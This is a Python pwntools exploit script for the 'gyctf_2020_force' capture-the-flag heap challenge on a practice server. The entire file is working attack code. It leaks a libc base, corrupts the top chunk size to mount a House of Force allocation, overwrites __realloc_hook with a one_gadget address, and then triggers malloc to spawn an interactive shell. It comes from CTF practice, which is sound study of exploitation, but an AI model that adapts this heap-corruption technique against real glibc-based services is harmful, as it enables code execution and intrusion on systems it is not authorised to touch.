#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.01.30 19.17.11
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'
libc_path = '/home/matrix/glibc-all-in-one/libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so'
ld_path = '/home/matrix/glibc-all-in-one/libs/libc6_2.23-0ubuntu10_amd64/ld-2.23.so'
elf_path = './gyctf_2020_force'
def add(size,cont):
	sh.sendlineafter('puts\n','1')
	sh.sendlineafter('size\n',str(size))
	sh.recvuntil('bin addr ')
	heap_addr = int(sh.recvuntil('\n',drop=1),16)
	sh.sendafter('content\n',str(cont))
	return heap_addr

def puts():
	sh.sendlineafter('puts\n','2')

def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))


host = 'node3.buuoj.cn'
port = 25179
local = 1
if local:
	context.log_level = 'debug'
	libc=ELF(libc_path)
	elf = ELF(elf_path)
	sh = process([ld_path,elf_path], env={"LD_PRELOAD":libc_path})
else:
	context.log_level = 'debug'
	libc=ELF('./libc-2.23.so')
	sh = remote(host,port)

sa = lambda s:show_addr('chunk',s)

def pwn():
	chunk1 = add(0x20000,'A'*8)
	sa(chunk1)
	libc_addr = chunk1 - 0x7cf010
	onegad_l = [0x45226,0x4527a,0xf0364,0xf1207]
	onegad_r = [0x45216,0x4526a,0xf02a4,0xf1147]
	onegadget = libc_addr + onegad_l[1]
	realloc_hook = libc_addr + libc.sym['__realloc_hook']
	realloc = libc_addr + libc.sym['realloc']
	malloc_hook = libc_addr + libc.sym['__malloc_hook']
	show_addr('realloc',realloc)
	show_addr('realloc_hook',realloc_hook)
	show_addr('onegadget',onegadget)
	show_addr('libc_addr',libc_addr)
	show_addr('malloc_hook',malloc_hook)
	gdb.attach(sh)
	chunk2 = add(0x10,'A'*0x18 + p64(0xffffffffffffffff))
	sa(chunk2)
	off = realloc_hook-0x10-chunk2-0x10-0x10
	log.info("off:0x{:x}".format(off))

	chunk3 = add(off,'B'*0x10)
	sa(chunk3)
	# gdb.attach(sh)
	chunk4 = add(0x20,p64(0)+p64(onegadget)+p64(realloc+2+2))
	sa(chunk4)
	gdb.attach(sh,'b*$rebase(0x0000000000000A20)')
	sh.sendlineafter('puts\n','1')

	sh.sendlineafter('size\n','10')
	# gdb.attach(sh)

if __name__ == '__main__':
	# while 1:
		try:
			pwn()
			sh.interactive()
		except:
			sh.close()
		
	
		# pass

